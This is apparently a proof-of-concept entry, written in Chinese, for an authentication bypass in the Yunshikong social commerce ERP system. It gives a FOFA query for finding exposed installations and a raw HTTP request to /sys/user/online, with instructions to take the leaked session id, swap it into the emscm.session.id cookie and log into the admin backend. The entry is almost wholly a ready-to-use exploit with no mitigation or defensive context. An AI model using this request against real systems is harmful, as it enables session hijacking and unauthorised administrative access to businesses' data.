# 云时空社会化商业ERP系统online存在身份认证绕过漏洞

## fofa

```java
app="云时空社会化商业ERP系统"
```

## poc

获取sessionid值，替换emscm.session.id，刷新页面即可登录后台

```java
GET /sys/user/online HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

